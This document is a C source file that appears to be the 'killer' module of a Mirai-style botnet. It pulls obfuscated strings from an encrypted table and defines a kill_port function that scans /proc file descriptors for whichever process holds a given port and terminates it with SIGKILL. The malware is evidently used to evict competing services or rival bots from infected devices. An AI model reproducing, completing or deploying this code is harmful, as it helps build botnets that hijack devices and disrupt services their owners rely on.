#define _GNU_SOURCE

#ifdef DEBUG
#endif

#include "headers/tcp.h"
#include "../../utils/headers/includes.h"
#include "../../utils/headers/util.h"
#include "../../utils/headers/rand.h"
#include "../../utils/headers/attack.h"
#include "../../encryption/chacha20_table.h"
#include "../../utils/headers/net_util.h"
#include "../../utils/headers/resolver.h"

/* Missing function declarations */
int find_inode_by_port(int port);
int isdigit(int c);
#define PATH_MAX 4096
void itoa(int value, int base, char *str);
int sys_getdents64(int fd, void *dirp, unsigned int count);
int sys_readlink(char *path, char *buf, size_t bufsiz);
int sys_open(const char *pathname, int flags, int mode);
int sys_kill(int pid, int sig);
#include "../debug.h"

struct linux_dirent64 {
    uint64_t        d_ino;
    int64_t         d_off;
    unsigned short  d_reclen;
    unsigned char   d_type;
    char            d_name[];
};

int kill_port(uint16_t port)
{
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    uint32_t target_inode = 0;
    int ret = 0;

    debug("Killing processes holding port %d (Netlink scan)\n", ntohs(port));

    target_inode = find_inode_by_port(ntohs(port));
    if (target_inode == 0) {
        return 0;
    }

    char inode_str[32];
    itoa(target_inode, 10, inode_str);

    int proc_fd = sys_open(enc[PROC_DIR].string, O_RDONLY | O_DIRECTORY, 0);
    if (proc_fd < 0) return 0;

    uint8_t d_buf[8192];
    int nread;

    while ((nread = sys_getdents64(proc_fd, d_buf, sizeof(d_buf))) > 0) {
        int bpos;
        for (bpos = 0; bpos < nread; ) {
            struct linux_dirent64 *d = (struct linux_dirent64 *)(d_buf + bpos);
            char *pid_str = d->d_name;

            if (isdigit(pid_str[0])) {
                int pid_num = atoi(pid_str);
                if (pid_num != sys_getpid() && pid_num != sys_getppid()) {
                    char fd_dir_path[128];
                    strcpy(fd_dir_path, enc[PROC_DIR].string);
                    strcat(fd_dir_path, pid_str);
                    strcat(fd_dir_path, enc[KILLER_FD].string);

                    int fd_dir_fd = sys_open(fd_dir_path, O_RDONLY | O_DIRECTORY, 0);
                    if (fd_dir_fd >= 0) {
                        uint8_t fd_d_buf[4096];
                        int fd_nread;
                        while ((fd_nread = sys_getdents64(fd_dir_fd, fd_d_buf, sizeof(fd_d_buf))) > 0) {
                            int fd_bpos;
                            for (fd_bpos = 0; fd_bpos < fd_nread; ) {
                                struct linux_dirent64 *fd_d = (struct linux_dirent64 *)(fd_d_buf + fd_bpos);
                                if (isdigit(fd_d->d_name[0])) {
                                    char full_fd_path[256];
                                    strcpy(full_fd_path, fd_dir_path);
                                    strcat(full_fd_path, enc[SLASH_STR].string);
                                    strcat(full_fd_path, fd_d->d_name);

                                    char link_target[128];
                                    int ll = sys_readlink(full_fd_path, link_target, sizeof(link_target)-1);
                                    if (ll > 0) {
                                        link_target[ll] = '\0';
                                        if (sys_strstr(link_target, inode_str)) {
                                            sys_kill(pid_num, 9);
                                            debug("Killed %d for holding port %d\n", pid_num, ntohs(port));
                                            ret = 1;
                                            sys_close(fd_dir_fd);
                                            goto done;
                                        }
                                    }
                                }
                                fd_bpos += fd_d->d_reclen;
                            }
                        }
                        sys_close(fd_dir_fd);
                    }
                }
            }
            bpos += d->d_reclen;
        }
    }

done:
    sys_close(proc_fd);
    return ret;
}
